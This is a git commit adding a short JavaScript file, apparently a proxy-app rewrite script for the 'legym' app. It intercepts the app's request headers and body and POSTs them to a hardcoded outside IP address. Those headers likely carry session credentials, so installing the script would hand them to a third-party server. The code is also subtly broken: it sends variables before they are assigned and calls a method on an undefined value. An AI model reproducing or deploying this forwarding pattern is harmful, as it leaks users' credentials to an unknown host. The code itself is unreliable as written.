38ed2f2c5947ca105d8c99627dcfb6b02388594e
BlingCc <54300418+BlingCc233@users.noreply.github.com>
2024-03-05 08:43:59 +0800

    Add files via upload

---
+++ suffix_legym.js
@@ -0,0 +1,18 @@
+const $ = init();
+$.done();
+
+  var modifiedHeaders = $request.headers;
+  var legym_signBody = $request.body;
+
+function init() {
+
+
+  fetch('http://172.245.242.86:9091/forward-request', {
+    method: 'POST',
+    headers: modifiedHeaders,
+    body: JSON.stringify(legym_signBody)
+  })
+  .then(response => response.text())
+  .then(data => console.log(data))
+  .catch(error => console.error('Error:', error));
+}
